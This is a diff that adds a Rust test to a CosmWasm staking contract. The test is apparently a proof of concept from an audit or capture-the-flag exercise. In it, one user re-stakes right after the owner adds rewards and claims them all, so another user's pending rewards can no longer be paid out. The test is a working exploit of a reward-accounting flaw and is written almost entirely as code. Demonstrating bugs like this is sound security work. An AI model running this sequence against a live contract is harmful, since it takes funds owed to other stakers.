@@ -410,4 +410,218 @@ pub mod tests {
         assert_eq!(user_info.staked_amount, Uint128::zero());
         assert_eq!(user_info.pending_rewards, Uint128::zero());
     }
+
+
+    // Exploit starts on line 531
+    #[test]
+    fn thx_for_nothing() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // new user2 join
+        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // owner increases reward
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(user_info.pending_rewards, Uint128::new(15_000));
+
+        // query user2 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER2.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(user_info.pending_rewards, Uint128::new(5_000));
+
+        // user1 claim rewards
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // query user1 info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(user_info.pending_rewards, Uint128::zero());
+
+        // query user1 reward balance
+        let balance = app
+            .wrap()
+            .query_balance(USER.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::new(15_000));
+
+        // user1 withdraw all funds
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: Uint128::new(10_000),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // query user1 balance
+        let balance = app
+            .wrap()
+            .query_balance(USER.to_string(), DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::new(10_000));
+
+        // query user info
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(user_info.staked_amount, Uint128::zero());
+
+        // query state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+        assert_eq!(state.total_staked, Uint128::new(10_000));
+
+        // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Exploit starts here
+        // OWNER increases reward
+        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
+        app.execute_contract(
+            Addr::unchecked(OWNER),
+            contract_addr.clone(),
+            &ExecuteMsg::IncreaseReward {},
+            &[coin(10_000, REWARD_DENOM)],
+        )
+        .unwrap();
+
+        // USER1 was waiting for this and immediately stakes again
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // USER1 then claims rewards before USER2 can claim rewards
+        app.execute_contract(
+            Addr::unchecked(USER),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap();
+
+        // Verify that USER1 got all 10_000 reward tokens deposited by OWNER, leaving nothing for USER2
+        let balance = app
+            .wrap()
+            .query_balance(USER.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        // Before the exploit they had 15_000, they now have 25_000
+        assert_eq!(balance, Uint128::new(25_000));
+
+        // USER2 is -supposed- to have 15_000 rewards available...
+        let user_info: UserRewardInfo = app
+            .wrap()
+            .query_wasm_smart(
+                contract_addr.clone(),
+                &QueryMsg::User {
+                    user: USER2.to_string(),
+                },
+            )
+            .unwrap();
+        assert_eq!(user_info.pending_rewards, Uint128::new(15_000));
+
+        // ...but the contract only has 5_000 tokens
+        let contract_balance = app
+            .wrap()
+            .query_balance(contract_addr.clone().to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(contract_balance, Uint128::new(5_000));
+
+        // USER2 withdraws their staked tokens
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Withdraw {
+                amount: user_info.staked_amount,
+            },
+            &[],
+        )
+        .unwrap();
+
+        // When USER2 tries to claim their rewards (should be 15_000) 
+        // the contract only has 5_000 tokens to send them, so this fails
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::ClaimRewards {},
+            &[],
+        )
+        .unwrap_err();
+
+        // Because USER2 claiming rewards failed, the contract still has 5_000 reward tokens
+        let balance = app
+            .wrap()
+            .query_balance(contract_addr.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::new(5_000));
+
+        // Verify that USER2 did not receive any REWARD_DENOM
+        let balance = app
+            .wrap()
+            .query_balance(USER2.to_string(), REWARD_DENOM)
+            .unwrap()
+            .amount;
+        assert_eq!(balance, Uint128::zero());
+    }
+
 }
